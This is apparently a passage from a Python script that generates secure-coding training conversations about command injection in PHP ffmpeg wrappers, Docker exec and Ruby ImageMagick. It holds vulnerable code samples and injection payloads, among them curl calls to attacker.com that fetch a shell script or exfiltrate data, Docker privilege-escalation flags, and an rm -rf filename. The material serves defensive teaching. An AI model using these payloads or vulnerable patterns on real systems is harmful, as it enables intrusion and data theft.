    // Allowlist of video codecs
    private const ALLOWED_VIDEO_CODECS = [
        'libx264' => ['name' => 'H.264', 'ext' => 'mp4'],
        'libx265' => ['name' => 'H.265', 'ext' => 'mp4'],
        'libvpx' => ['name' => 'VP8', 'ext' => 'webm'],
        'libvpx-vp9' => ['name' => 'VP9', 'ext' => 'webm'],
    ];

    // Allowlist of audio codecs
    private const ALLOWED_AUDIO_CODECS = [
        'aac' => 'AAC',
        'libmp3lame' => 'MP3',
        'libopus' => 'Opus',
        'libvorbis' => 'Vorbis',
    ];

    // Quality presets (CRF values for x264/x265)
    private const QUALITY_PRESETS = [
        'high' => 18,
        'medium' => 23,
        'low' => 28,
    ];

    // Resolution presets
    private const RESOLUTION_PRESETS = [
        '1080p' => '1920:1080',
        '720p' => '1280:720',
        '480p' => '854:480',
        '360p' => '640:360',
    ];

    private $uploadDir;
    private $outputDir;

    public function __construct(string $uploadDir, string $outputDir) {
        $this->uploadDir = rtrim(realpath($uploadDir), '/');
        $this->outputDir = rtrim(realpath($outputDir), '/');
    }

    /**
     * Validate transcoding profile
     */
    private function validateProfile(array $profile): void {
        // Validate video codec
        if (!isset($profile['video_codec']) ||
            !array_key_exists($profile['video_codec'], self::ALLOWED_VIDEO_CODECS)) {
            throw new SecurityException("Invalid video codec");
        }

        // Validate audio codec
        if (!isset($profile['audio_codec']) ||
            !array_key_exists($profile['audio_codec'], self::ALLOWED_AUDIO_CODECS)) {
            throw new SecurityException("Invalid audio codec");
        }

        // Validate quality preset
        if (!isset($profile['quality']) ||
            !array_key_exists($profile['quality'], self::QUALITY_PRESETS)) {
            throw new SecurityException("Invalid quality preset");
        }

        // Validate resolution (optional)
        if (isset($profile['resolution']) &&
            !array_key_exists($profile['resolution'], self::RESOLUTION_PRESETS)) {
            throw new SecurityException("Invalid resolution preset");
        }

        // Validate bitrate (optional)
        if (isset($profile['bitrate'])) {
            if (!is_numeric($profile['bitrate']) ||
                $profile['bitrate'] < 100 ||
                $profile['bitrate'] > 10000) {
                throw new SecurityException("Invalid bitrate (100-10000 kbps)");
            }
        }
    }

    /**
     * Build ffmpeg arguments from validated profile
     */
    private function buildTranscodeArgs(
        string $inputFile,
        string $outputFile,
        array $profile
    ): array {
        $args = ['/usr/bin/ffmpeg'];

        // Input file
        $args[] = '-i';
        $args[] = $inputFile;

        // Video codec
        $args[] = '-c:v';
        $args[] = $profile['video_codec'];

        // Quality (CRF)
        $crfValue = self::QUALITY_PRESETS[$profile['quality']];
        $args[] = '-crf';
        $args[] = (string)$crfValue;

        // Resolution (if specified)
        if (isset($profile['resolution'])) {
            $args[] = '-vf';
            $args[] = 'scale=' . self::RESOLUTION_PRESETS[$profile['resolution']];
        }

        // Audio codec
        $args[] = '-c:a';
        $args[] = $profile['audio_codec'];

        // Audio bitrate (if specified)
        if (isset($profile['bitrate'])) {
            $args[] = '-b:a';
            $args[] = $profile['bitrate'] . 'k';
        }

        // Preset (encoding speed)
        $args[] = '-preset';
        $args[] = 'medium';

        // Overwrite output
        $args[] = '-y';

        // Output file
        $args[] = $outputFile;

        return $args;
    }

    /**
     * Transcode video with validated profile
     */
    public function transcode(
        string $inputFile,
        string $outputFile,
        array $profile
    ): array {
        try {
            // Validate profile first
            $this->validateProfile($profile);

            // Validate input file
            $realInput = realpath($inputFile);
            if ($realInput === false) {
                throw new SecurityException("Input file not found");
            }

            if (strpos($realInput, $this->uploadDir . '/') !== 0) {
                throw new SecurityException("Input not in allowed directory");
            }

            // Validate file size
            $fileSize = filesize($realInput);
            if ($fileSize > self::MAX_FILE_SIZE) {
                throw new SecurityException("File too large");
            }

            // Validate output path
            $outputBasename = basename($outputFile);
            if (!preg_match('/^[a-zA-Z0-9_-]+\\.[a-z0-9]+$/', $outputBasename)) {
                throw new SecurityException("Invalid output filename");
            }

            $fullOutput = $this->outputDir . '/' . $outputBasename;

            // Build ffmpeg command
            $command = $this->buildTranscodeArgs($realInput, $fullOutput, $profile);

            // Execute with proc_open (no shell)
            $descriptors = [
                0 => ["pipe", "r"],
                1 => ["pipe", "w"],
                2 => ["pipe", "w"],
            ];

            $process = proc_open($command, $descriptors, $pipes, null, []);

            if (!is_resource($process)) {
                throw new Exception("Failed to start ffmpeg");
            }

            fclose($pipes[0]);

            // Monitor with timeout
            $startTime = time();
            while (true) {
                if (time() - $startTime > self::TIMEOUT) {
                    proc_terminate($process, 9);
                    throw new Exception("Transcoding timeout");
                }

                $status = proc_get_status($process);
                if (!$status['running']) {
                    break;
                }

                sleep(1);
            }

            fclose($pipes[1]);
            fclose($pipes[2]);

            $exitCode = proc_close($process);

            if ($exitCode !== 0) {
                return ['success' => false, 'error' => 'Transcoding failed'];
            }

            if (!file_exists($fullOutput)) {
                return ['success' => false, 'error' => 'Output not created'];
            }

            return [
                'success' => true,
                'output' => $fullOutput,
                'size' => filesize($fullOutput)
            ];

        } catch (SecurityException $e) {
            return ['success' => false, 'error' => 'Validation failed'];
        } catch (Exception $e) {
            return ['success' => false, 'error' => 'Processing error'];
        }
    }
}

// Usage with validated profiles
$transcoder = new SecureVideoTranscoder(
    '/var/www/uploads',
    '/var/www/output'
);

// High-quality H.264 at 1080p
$profile = [
    'video_codec' => 'libx264',
    'audio_codec' => 'aac',
    'quality' => 'high',
    'resolution' => '1080p',
    'bitrate' => 192
];

$result = $transcoder->transcode(
    '/var/www/uploads/source.mp4',
    'output-1080p.mp4',
    $profile
);

if ($result['success']) {
    echo "Transcoded: " . $result['output'] . "\\n";
}

// Attack attempt: malicious codec parameter
$attackProfile = [
    'video_codec' => 'libx264; curl http://attacker.com/shell.sh | bash',
    'audio_codec' => 'aac',
    'quality' => 'high'
];

$result = $transcoder->transcode(
    '/var/www/uploads/source.mp4',
    'output.mp4',
    $attackProfile
);
// Error: "Invalid video codec" - blocked by allowlist
```

**Profile System Benefits:**

1. **Codec Allowlists**: Only approved codecs permitted
2. **Quality Presets**: Predefined safe values prevent injection
3. **Resolution Presets**: Fixed scale values, no user input
4. **Bitrate Validation**: Numeric range check
5. **Profile Validation**: All options checked before building command
6. **Argument Builder**: Constructs command safely from validated options

This approach gives users flexibility to configure transcoding while maintaining complete security through strict validation and allowlisting."""

    return {
        "id": "sql-injection-000030",
        "metadata": create_base_metadata("php", 30, "shell_metacharacter_bypass"),
        "context": IMAGEMAGICK_CONTEXT,
        "conversations": [
            {"role": "user", "content": user_turn_1},
            {"role": "assistant", "content": assistant_turn_1},
            {"role": "user", "content": user_turn_3},
            {"role": "assistant", "content": assistant_turn_3}
        ]
    }


def example_006_container_escape_python():
    """Python - Container Escape via Docker Command Injection"""

    user_turn_1 = """I'm building a Docker container management API in Python. How do I safely execute docker commands with user-provided container names?"""

    assistant_turn_1 = """I'll show you how container command injection can lead to escape, and then the secure approach using the Docker SDK.

**VULNERABLE CODE - DO NOT USE:**

```python
import subprocess

def execute_in_container(container_name, command):
    # DANGER: Passes user input directly to docker exec
    full_command = f"docker exec {container_name} {command}"
    result = subprocess.run(
        full_command,
        shell=True,
        capture_output=True,
        text=True
    )
    return result.stdout
```

**Why This Is Dangerous:**

Attackers can inject Docker flags to escape container isolation or access the host system:

**Attack Payload:**
```python
# Attack 1: Mount host filesystem
container_name = "webapp --privileged -v /:/host"
command = "cat /host/etc/shadow"

execute_in_container(container_name, command)

# Attack 2: Escape to host namespace
container_name = "webapp --pid=host --net=host --ipc=host"
command = "ps aux"  # See all host processes

execute_in_container(container_name, command)
```

**Result:** Full host filesystem access and namespace escape.

**Real-World Impact:**

{}

**SECURE IMPLEMENTATION:**

```python
import docker
import re
from typing import Optional, Dict, Any, List

class SecureContainerManager:
    \"\"\"Secure Docker container management using Docker SDK.\"\"\"

    # Container name/ID pattern: alphanumeric and underscore only
    CONTAINER_PATTERN = re.compile(r'^[a-zA-Z0-9_-]{{1,64}}$')

    # Allowed commands (allowlist approach)
    ALLOWED_COMMANDS = {{
        'ls': ['-la', '-lh'],
        'cat': [],
        'tail': ['-n', '-f'],
        'head': ['-n'],
        'ps': ['aux', '-ef'],
        'df': ['-h'],
    }

    def __init__(self):
        try:
            self.client = docker.from_env()
        except docker.errors.DockerException as e:
            raise RuntimeError(f"Failed to connect to Docker: {{e}}")

    def validate_container_id(self, container_id: str) -> str:
        \"\"\"
        Validate container ID or name.

        Security checks:
        1. Format validation (alphanumeric, dash, underscore)
        2. Container must exist
        3. Container must be running
        4. Return full container ID (64-char hex)
        \"\"\"
        if not container_id or not isinstance(container_id, str):
            raise ValueError("Container ID cannot be empty")

        # Check format
        if not self.CONTAINER_PATTERN.match(container_id):
            raise ValueError(
                "Invalid container ID format. "
                "Must be alphanumeric, dash, or underscore only"
            )

        try:
            # Get container object
            container = self.client.containers.get(container_id)

            # Verify container is running
            container.reload()
            if container.status != 'running':
                raise ValueError(f"Container is not running: {{container.status}}")

            # Return full container ID (64-char hex)
            return container.id

        except docker.errors.NotFound:
            raise ValueError(f"Container not found: {{container_id}}")
        except docker.errors.APIError as e:
            raise RuntimeError(f"Docker API error: {{e}}")

    def validate_command(self, cmd: str, args: List[str]) -> tuple:
        \"\"\"
        Validate command against allowlist.

        Returns: (cmd, validated_args)
        \"\"\"
        if cmd not in self.ALLOWED_COMMANDS:
            raise ValueError(f"Command not in allowlist: {{cmd}}")

        allowed_args = self.ALLOWED_COMMANDS[cmd]
        validated_args = []

        for arg in args:
            # Arguments must be in allowlist OR be safe file paths
            if arg in allowed_args:
                validated_args.append(arg)
            elif self.is_safe_path(arg):
                validated_args.append(arg)
            else:
                raise ValueError(f"Argument not allowed: {{arg}}")

        return cmd, validated_args

    def is_safe_path(self, path: str) -> bool:
        \"\"\"Validate path is safe (no command injection metacharacters).\"\"\"
        if not path:
            return False

        # Path must not contain shell metacharacters
        dangerous_chars = {{';', '&', '|', '`', '$', '(', ')', '<', '>', '\\n', '\\r'}
        if any(char in path for char in dangerous_chars):
            return False

        # Must match safe path pattern
        path_pattern = re.compile(r'^[a-zA-Z0-9/._-]{{1,256}}$')
        return bool(path_pattern.match(path))

    def exec_in_container(
        self,
        container_id: str,
        cmd: str,
        args: Optional[List[str]] = None
    ) -> Dict[str, Any]:
        \"\"\"
        Execute command in container using Docker SDK.

        Security controls:
        1. Container ID validation
        2. Command allowlist
        3. Argument validation
        4. SDK execution (no shell)
        5. Output size limits
        \"\"\"
        args = args or []

        try:
            # Validate container
            valid_container_id = self.validate_container_id(container_id)

            # Validate command
            valid_cmd, valid_args = self.validate_command(cmd, args)

            # Build full command
            full_command = [valid_cmd] + valid_args

            # Get container
            container = self.client.containers.get(valid_container_id)

            # Execute command using SDK (no shell)
            exit_code, output = container.exec_run(
                cmd=full_command,
                stdout=True,
                stderr=True,
                stdin=False,
                tty=False,
                privileged=False,  # CRITICAL: Never privileged
                user='',           # Use container's default user
                environment={{}}     # No environment variables
            )

            # Limit output size to prevent memory exhaustion
            output_str = output.decode('utf-8', errors='replace')
            if len(output_str) > 100000:  # 100KB limit
                output_str = output_str[:100000] + "\\n[Output truncated]"

            return {
                "success": exit_code == 0,
                "exit_code": exit_code,
                "output": output_str
            }

        except ValueError as e:
            return {
                "success": False,
                "error": f"Validation error: {{e}}"
            }
        except docker.errors.APIError as e:
            return {
                "success": False,
                "error": "Container execution failed"
            }

    def list_containers(self, filters: Optional[Dict[str, str]] = None) -> List[Dict]:
        \"\"\"
        List containers with optional filters.

        Returns container info without sensitive data.
        \"\"\"
        try:
            containers = self.client.containers.list(
                all=False,  # Only running containers
                filters=filters or {{}
            )

            result = []
            for container in containers:
                result.append({{
                    "id": container.short_id,
                    "name": container.name,
                    "status": container.status,
                    "image": container.image.tags[0] if container.image.tags else "unknown"
                }})

            return result

        except docker.errors.APIError:
            return []


# Usage
manager = SecureContainerManager()

# Safe execution
result = manager.exec_in_container(
    container_id="webapp",
    cmd="ls",
    args=["-la", "/var/www"]
)

if result["success"]:
    print(result["output"])
else:
    print(f"Error: {{result['error']}}")

# Attack attempts blocked
try:
    # Attack 1: Malicious container name with flags
    result = manager.exec_in_container(
        container_id="webapp --privileged",
        cmd="ls"
    )
except ValueError as e:
    print(f"Attack blocked: {{e}}")

try:
    # Attack 2: Command injection in arguments
    result = manager.exec_in_container(
        container_id="webapp",
        cmd="cat",
        args=["/etc/passwd; curl http://attacker.com/exfil"]
    )
except ValueError as e:
    print(f"Attack blocked: {{e}}")
```

**Key Security Controls:**

1. **Docker SDK**: Use official SDK instead of shell commands
2. **Container ID Validation**: Alphanumeric only, must exist and be running
3. **Command Allowlist**: Only pre-approved commands
4. **Argument Validation**: Each argument validated
5. **No Privileged Mode**: privileged=False always
6. **Output Limiting**: Prevent memory exhaustion
""" + f"\n\n{DOCKER_ESCAPE_CONTEXT}\n"

    user_turn_3 = """What if I need to support log streaming and file uploads to containers with different user permissions?"""

    assistant_turn_3 = """Create a secure container operation framework with role-based operations:

```python
import docker
import re
import tarfile
import io
from typing import Optional, Dict, Any, List, Iterator
from enum import Enum

class ContainerOperation(Enum):
    EXEC = "exec"
    LOGS = "logs"
    UPLOAD = "upload"
    DOWNLOAD = "download"

class SecureContainerOperations:
    \"\"\"Advanced container operations with security controls.\"\"\"

    CONTAINER_PATTERN = re.compile(r'^[a-zA-Z0-9_-]{{1,64}}$')
    PATH_PATTERN = re.compile(r'^[a-zA-Z0-9/._-]{{1,256}}$')

    # Role-based operation permissions
    ROLE_PERMISSIONS = {{
        'readonly': {{ContainerOperation.LOGS, ContainerOperation.DOWNLOAD},
        'operator': {{ContainerOperation.EXEC, ContainerOperation.LOGS, ContainerOperation.DOWNLOAD},
        'admin': {{ContainerOperation.EXEC, ContainerOperation.LOGS,
                  ContainerOperation.UPLOAD, ContainerOperation.DOWNLOAD}
    }

    def __init__(self, role: str = 'readonly'):
        if role not in self.ROLE_PERMISSIONS:
            raise ValueError(f"Invalid role: {{role}}")

        self.role = role
        self.permissions = self.ROLE_PERMISSIONS[role]

        try:
            self.client = docker.from_env()
        except docker.errors.DockerException as e:
            raise RuntimeError(f"Failed to connect to Docker: {{e}}")

    def check_permission(self, operation: ContainerOperation) -> None:
        \"\"\"Check if current role has permission for operation.\"\"\"
        if operation not in self.permissions:
            raise PermissionError(
                f"Role '{{self.role}}' does not have permission for {{operation.value}}"
            )

    def validate_container_path(self, path: str) -> str:
        \"\"\"Validate container file path.\"\"\"
        if not path or not isinstance(path, str):
            raise ValueError("Path cannot be empty")

        # Must match safe path pattern
        if not self.PATH_PATTERN.match(path):
            raise ValueError("Invalid path format")

        # Must be absolute path
        if not path.startswith('/'):
            raise ValueError("Path must be absolute")

        # No path traversal
        if '..' in path:
            raise ValueError("Path traversal not allowed")

        return path

    def stream_logs(
        self,
        container_id: str,
        tail: int = 100,
        follow: bool = False
    ) -> Iterator[str]:
        \"\"\"
        Stream container logs securely.

        Security controls:
        1. Permission check
        2. Container validation
        3. Tail limit (max 10000 lines)
        4. Safe iteration
        \"\"\"
        self.check_permission(ContainerOperation.LOGS)

        # Validate container ID
        if not self.CONTAINER_PATTERN.match(container_id):
            raise ValueError("Invalid container ID")

        # Limit tail to prevent resource exhaustion
        tail = min(tail, 10000)

        try:
            container = self.client.containers.get(container_id)

            # Stream logs using SDK
            log_stream = container.logs(
                stdout=True,
                stderr=True,
                stream=follow,
                tail=tail,
                timestamps=True
            )

            if follow:
                # Streaming mode
                for line in log_stream:
                    yield line.decode('utf-8', errors='replace')
            else:
                # Single fetch
                logs = log_stream.decode('utf-8', errors='replace')
                for line in logs.splitlines():
                    yield line

        except docker.errors.NotFound:
            raise ValueError(f"Container not found: {{container_id}}")
        except docker.errors.APIError as e:
            raise RuntimeError("Failed to fetch logs")

    def upload_file(
        self,
        container_id: str,
        local_path: str,
        container_path: str
    ) -> Dict[str, Any]:
        \"\"\"
        Upload file to container securely.

        Security controls:
        1. Permission check (admin only)
        2. Container validation
        3. Path validation
        4. File size limits
        5. Tar streaming (no temp files)
        \"\"\"
        self.check_permission(ContainerOperation.UPLOAD)

        # Validate container
        if not self.CONTAINER_PATTERN.match(container_id):
            raise ValueError("Invalid container ID")

        # Validate destination path
        container_path = self.validate_container_path(container_path)

        try:
            container = self.client.containers.get(container_id)

            # Read local file with size limit (10MB)
            max_size = 10 * 1024 * 1024
            with open(local_path, 'rb') as f:
                file_data = f.read(max_size + 1)
                if len(file_data) > max_size:
                    raise ValueError("File exceeds 10MB limit")

            # Create tar archive in memory
            tar_stream = io.BytesIO()
            with tarfile.open(fileobj=tar_stream, mode='w') as tar:
                tarinfo = tarfile.TarInfo(name=container_path.split('/')[-1])
                tarinfo.size = len(file_data)
                tar.addfile(tarinfo, io.BytesIO(file_data))

            tar_stream.seek(0)

            # Upload to container
            container.put_archive(
                path=container_path.rsplit('/', 1)[0] or '/',
                data=tar_stream
            )

            return {
                "success": True,
                "uploaded": container_path,
                "size": len(file_data)
            }

        except FileNotFoundError:
            return {"success": False, "error": "Local file not found"}
        except docker.errors.NotFound:
            return {"success": False, "error": "Container not found"}
        except docker.errors.APIError:
            return {"success": False, "error": "Upload failed"}

    def download_file(
        self,
        container_id: str,
        container_path: str
    ) -> Optional[bytes]:
        \"\"\"
        Download file from container securely.

        Security controls:
        1. Permission check
        2. Path validation
        3. Size limits
        4. Safe tar extraction
        \"\"\"
        self.check_permission(ContainerOperation.DOWNLOAD)

        # Validate container
        if not self.CONTAINER_PATTERN.match(container_id):
            raise ValueError("Invalid container ID")

        # Validate path
        container_path = self.validate_container_path(container_path)

        try:
            container = self.client.containers.get(container_id)

            # Get archive from container
            bits, stat = container.get_archive(container_path)

            # Limit download size (50MB)
            max_size = 50 * 1024 * 1024
            data = b''
            for chunk in bits:
                data += chunk
                if len(data) > max_size:
                    raise ValueError("File exceeds 50MB download limit")

            # Extract from tar
            tar_stream = io.BytesIO(data)
            with tarfile.open(fileobj=tar_stream, mode='r') as tar:
                # Get first file in archive
                members = tar.getmembers()
                if not members:
                    return None

                file_obj = tar.extractfile(members[0])
                if file_obj is None:
                    return None

                return file_obj.read()

        except docker.errors.NotFound:
            raise ValueError("Container or path not found")
        except docker.errors.APIError:
            raise RuntimeError("Download failed")


# Usage with role-based access
readonly_ops = SecureContainerOperations(role='readonly')

# Allowed: Stream logs
for line in readonly_ops.stream_logs('webapp', tail=50):
    print(line)

# Blocked: Upload file (readonly role)
try:
    readonly_ops.upload_file('webapp', '/local/file.txt', '/app/file.txt')
except PermissionError as e:
    print(f"Permission denied: {{e}}")

# Admin operations
admin_ops = SecureContainerOperations(role='admin')

# Upload file
result = admin_ops.upload_file(
    'webapp',
    '/tmp/config.json',
    '/app/config/config.json'
)

if result['success']:
    print(f"Uploaded {{result['size']}} bytes")

# Download file
file_data = admin_ops.download_file('webapp', '/app/logs/app.log')
if file_data:
    print(f"Downloaded {{len(file_data)}} bytes")
```

**Advanced Security Features:**

1. **Role-Based Access**: Different permissions for different roles
2. **Log Streaming**: Safe iteration with size limits
3. **File Upload/Download**: Tar-based transfer (no temp files)
4. **Size Limits**: Prevent resource exhaustion
5. **Permission Checks**: Operations validated against role

This framework provides comprehensive container operations while maintaining strict security boundaries."""

    return {
        "id": "sql-injection-000031",
        "metadata": create_base_metadata("python", 31, "container_escape_command_injection"),
        "context": DOCKER_ESCAPE_CONTEXT,
        "conversations": [
            {"role": "user", "content": user_turn_1},
            {"role": "assistant", "content": assistant_turn_1},
            {"role": "user", "content": user_turn_3},
            {"role": "assistant", "content": assistant_turn_3}
        ]
    }


def example_007_imagemagick_injection_ruby():
    """Ruby - ImageMagick Command Injection"""

    user_turn_1 = """I'm building an image processing service in Ruby that resizes and converts images. How do I safely use ImageMagick?"""

    assistant_turn_1 = """I'll show you the dangerous approach and then the secure way using RMagick/MiniMagick libraries.

**VULNERABLE CODE - DO NOT USE:**

```ruby
class ImageProcessor
  # DANGER: Passing user filenames to convert command
  def self.resize_image(input_file, output_file, dimensions)
    command = "convert #{input_file} -resize #{dimensions} #{output_file}"
    `#{command}`
  end
end
```

**Why This Is Dangerous:**

ImageMagick's convert command can execute shell commands through specially crafted filenames or image files:

**Attack Payloads:**
```ruby
# Attack 1: Filename with embedded command
input_file = '"|ls -la"'
ImageProcessor.resize_image(input_file, 'output.jpg', '800x600')

# Attack 2: SVG with embedded commands (ImageTragick)
# SVG file containing:
# <image xlink:href="https://example.com/image.jpg\"|ls -la\"">

# Attack 3: Shell metacharacters in filename
input_file = 'image.jpg; rm -rf /var/www/uploads'
ImageProcessor.resize_image(input_file, 'output.jpg', '800x600')
```

**Result:** Remote code execution with web server privileges.

**Real-World Impact:**

{}

**SECURE IMPLEMENTATION:**

```ruby
require 'mini_magick'
require 'pathname'

class SecureImageProcessor
  ALLOWED_EXTENSIONS = %w[.jpg .jpeg .png .gif .webp .bmp].freeze
  ALLOWED_DIRECTORIES = ['/var/www/uploads', '/var/www/processed'].freeze
  MAX_FILE_SIZE = 20 * 1024 * 1024 # 20MB
  MAX_DIMENSIONS = 4000 # 4000x4000 max

  class SecurityError < StandardError; end

  # Validate file path before processing
  def self.validate_path(path, must_exist: true)
    raise SecurityError, 'Path cannot be empty' if path.nil? || path.empty?

    # Get absolute, canonical path (resolves symlinks, ..)
    begin
      real_path = Pathname.new(path).realpath.to_s
    rescue Errno::ENOENT
      raise SecurityError, 'File does not exist' if must_exist
      # For output files that don't exist yet
      real_path = Pathname.new(path).expand_path.to_s
    end

    # Verify within allowed directories
    allowed = ALLOWED_DIRECTORIES.any? { |dir| real_path.start_with?(dir) }
    raise SecurityError, 'Path not in allowed directories' unless allowed

    # Validate extension
    extension = File.extname(real_path).downcase
    unless ALLOWED_EXTENSIONS.include?(extension)
      raise SecurityError, "Invalid file extension: #{extension}"
    end

    # If file must exist, validate it
    if must_exist
      raise SecurityError, 'File does not exist' unless File.exist?(real_path)
      raise SecurityError, 'Not a regular file' unless File.file?(real_path)
      raise SecurityError, 'File not readable' unless File.readable?(real_path)

      # Check file size
      file_size = File.size(real_path)
      raise SecurityError, 'File too large' if file_size > MAX_FILE_SIZE

      # Validate magic number (file signature)
      validate_image_magic_number(real_path)
    end

    real_path
  end

  # Validate file is actually an image by checking magic number
  def self.validate_image_magic_number(path)
    magic_numbers = {
      "\xFF\xD8\xFF" => 'JPEG',
      "\x89PNG" => 'PNG',
      "GIF87a" => 'GIF',
      "GIF89a" => 'GIF',
      "RIFF" => 'WEBP',
      "BM" => 'BMP'
    }

    File.open(path, 'rb') do |file|
      header = file.read(8)
      return if header.nil?

      magic_numbers.each do |signature, format|
        return if header.start_with?(signature)
      end

      raise SecurityError, 'File is not a valid image (magic number check failed)'
    end
  end

  # Validate dimensions (WIDTHxHEIGHT format)
  def self.validate_dimensions(dimensions)
    unless dimensions.match?(/^\d{1,4}x\d{1,4}$/)
      raise SecurityError, 'Invalid dimensions format (must be WIDTHxHEIGHT)'
    end

    width, height = dimensions.split('x').map(&:to_i)

    if width > MAX_DIMENSIONS || height > MAX_DIMENSIONS
      raise SecurityError, "Dimensions exceed maximum (#{MAX_DIMENSIONS}x#{MAX_DIMENSIONS})"
    end

    if width < 1 || height < 1
      raise SecurityError, 'Dimensions must be at least 1x1'
    end

    [width, height]
  end

  # Resize image using MiniMagick (safer than shell commands)
  def self.resize_image(input_file, output_file, dimensions)
    # Validate all inputs
    valid_input = validate_path(input_file, must_exist: true)
    valid_output = validate_path(output_file, must_exist: false)
    width, height = validate_dimensions(dimensions)

    begin
      # Use MiniMagick library (no shell execution)
      image = MiniMagick::Image.open(valid_input)

      # Disable dangerous coders (prevent ImageTragick)
      image.auto_orient  # Fix orientation

      # Resize with geometry string
      image.resize "#{width}x#{height}>"  # > means shrink only, never enlarge

      # Strip metadata (privacy and security)
      image.strip

      # Set quality
      image.quality 85

      # Write to output
      image.write valid_output

      {
        success: true,
        output: valid_output,
        size: File.size(valid_output)
      }
    rescue MiniMagick::Error => e
      # Don't expose internal errors to users
      {
        success: false,
        error: 'Image processing failed'
      }
    end
  end
end

# Usage
result = SecureImageProcessor.resize_image(
  '/var/www/uploads/photo.jpg',
  '/var/www/processed/photo_thumb.jpg',
  '800x600'
)

if result[:success]
  puts "Processed: #{result[:output]} (#{result[:size]} bytes)"
else
  puts "Error: #{result[:error]}"
end

# Attack attempts blocked
begin
  # Malicious filename
  SecureImageProcessor.resize_image(
    '"|ls -la"',
    '/var/www/processed/output.jpg',
    '800x600'
  )
rescue SecureImageProcessor::SecurityError => e
  puts "Attack blocked: #{e.message}"
end
```

**Key Security Controls:**

1. **MiniMagick Library**: Uses library instead of shell commands
2. **Path Canonicalization**: Pathname.realpath resolves symlinks and ../
3. **Magic Number Validation**: Verify file is actually an image
4. **Extension Allowlist**: Only approved image formats
5. **Size Limits**: Prevent resource exhaustion
6. **Metadata Stripping**: Remove potentially dangerous metadata
7. **Dimension Validation**: Strict format and range checks
""" + f"\n\n{IMAGEMAGICK_CONTEXT}\n"

    user_turn_3 = """What if I need to support different operations like cropping, watermarking, and format conversion with various quality settings?"""

    assistant_turn_3 = """Create a validated operation builder for image processing:

```ruby
require 'mini_magick'
require 'pathname'

class SecureImageOperations
  ALLOWED_EXTENSIONS = %w[.jpg .jpeg .png .gif .webp].freeze
  ALLOWED_DIRECTORIES = ['/var/www/uploads', '/var/www/processed'].freeze
  MAX_FILE_SIZE = 20 * 1024 * 1024
  MAX_DIMENSIONS = 4000

  # Allowed operations with parameter schemas
  OPERATIONS = {
    resize: {
      params: [:dimensions],
      validator: :validate_dimensions
    },
    crop: {
      params: [:geometry],
      validator: :validate_crop_geometry
    },
    watermark: {
      params: [:watermark_file, :position],
      validator: :validate_watermark_params
    },
    convert: {
      params: [:format],
      validator: :validate_format
    },
    quality: {
      params: [:quality_value],
      validator: :validate_quality
    }
  }.freeze

  ALLOWED_FORMATS = %w[jpeg jpg png webp gif].freeze
  ALLOWED_POSITIONS = %w[center north south east west northeast northwest southeast southwest].freeze

  class SecurityError < StandardError; end

  def initialize(input_file)
    @input_file = validate_path(input_file, must_exist: true)
    @operations = []

    # Open image with MiniMagick
    @image = MiniMagick::Image.open(@input_file)

    # Disable dangerous coders
    MiniMagick.configure do |config|
      config.cli = :imagemagick
    end
  end

  # Validate dimensions format
  def validate_dimensions(dimensions)
    unless dimensions.match?(/^\d{1,4}x\d{1,4}[><!^]?$/)
      raise SecurityError, 'Invalid dimensions'
    end

    width, height = dimensions.scan(/\d+/).map(&:to_i)
    if width > MAX_DIMENSIONS || height > MAX_DIMENSIONS
      raise SecurityError, 'Dimensions too large'
    end

    dimensions
  end

  # Validate crop geometry (WIDTHxHEIGHT+X+Y)
  def validate_crop_geometry(geometry)
    unless geometry.match?(/^\d{1,4}x\d{1,4}\+\d{1,4}\+\d{1,4}$/)
      raise SecurityError, 'Invalid crop geometry'
    end

    geometry
  end

  # Validate watermark parameters
  def validate_watermark_params(watermark_file, position)
    valid_watermark = validate_path(watermark_file, must_exist: true)

    unless ALLOWED_POSITIONS.include?(position)
      raise SecurityError, 'Invalid watermark position'
    end

    [valid_watermark, position]
  end

  # Validate output format
  def validate_format(format)
    format = format.to_s.downcase
    unless ALLOWED_FORMATS.include?(format)
      raise SecurityError, "Invalid format: #{format}"
    end

    format
  end

  # Validate quality value
  def validate_quality(quality_value)
    quality = quality_value.to_i
    unless (1..100).cover?(quality)
      raise SecurityError, 'Quality must be 1-100'
    end

    quality
  end

  # Validate path (same as before)
  def validate_path(path, must_exist: true)
    raise SecurityError, 'Path cannot be empty' if path.nil? || path.empty?

    begin
      real_path = Pathname.new(path).realpath.to_s
    rescue Errno::ENOENT
      raise SecurityError, 'File does not exist' if must_exist
      real_path = Pathname.new(path).expand_path.to_s
    end

    allowed = ALLOWED_DIRECTORIES.any? { |dir| real_path.start_with?(dir) }
    raise SecurityError, 'Path not in allowed directories' unless allowed

    extension = File.extname(real_path).downcase
    unless ALLOWED_EXTENSIONS.include?(extension)
      raise SecurityError, "Invalid extension: #{extension}"
    end

    if must_exist
      raise SecurityError, 'Not a file' unless File.file?(real_path)
      raise SecurityError, 'Not readable' unless File.readable?(real_path)
      raise SecurityError, 'File too large' if File.size(real_path) > MAX_FILE_SIZE
    end

    real_path
  end

  # Add operation with validation
  def add_operation(operation, *params)
    operation = operation.to_sym

    unless OPERATIONS.key?(operation)
      raise SecurityError, "Unknown operation: #{operation}"
    end

    schema = OPERATIONS[operation]

    # Validate parameter count
    if params.length != schema[:params].length
      raise SecurityError, "Invalid parameter count for #{operation}"
    end

    # Validate parameters
    validator_method = schema[:validator]
    validated_params = send(validator_method, *params)
    validated_params = [validated_params] unless validated_params.is_a?(Array)

    @operations << { op: operation, params: validated_params }

    self  # Enable method chaining
  end

  # Execute all operations and save
  def execute(output_file)
    valid_output = validate_path(output_file, must_exist: false)

    begin
      # Apply each operation
      @operations.each do |operation|
        case operation[:op]
        when :resize
          @image.resize operation[:params][0]
        when :crop
          @image.crop operation[:params][0]
        when :watermark
          watermark_file, position = operation[:params]
          # Composite watermark
          @image.composite(MiniMagick::Image.open(watermark_file)) do |c|
            c.gravity position
          end
        when :convert
          @image.format operation[:params][0]
        when :quality
          @image.quality operation[:params][0]
        end
      end

      # Strip metadata
      @image.strip

      # Auto-orient
      @image.auto_orient

      # Write output
      @image.write valid_output

      {
        success: true,
        output: valid_output,
        size: File.size(valid_output),
        operations: @operations.length
      }
    rescue MiniMagick::Error
      {
        success: false,
        error: 'Image processing failed'
      }
    end
  end
end

# Usage: Chain multiple operations
processor = SecureImageOperations.new('/var/www/uploads/photo.jpg')

result = processor
  .add_operation(:resize, '1200x800>')
  .add_operation(:crop, '800x600+100+50')
  .add_operation(:watermark, '/var/www/uploads/logo.png', 'southeast')
  .add_operation(:quality, 85)
  .add_operation(:convert, 'webp')
  .execute('/var/www/processed/photo_processed.webp')

if result[:success]
  puts "Processed with #{result[:operations]} operations"
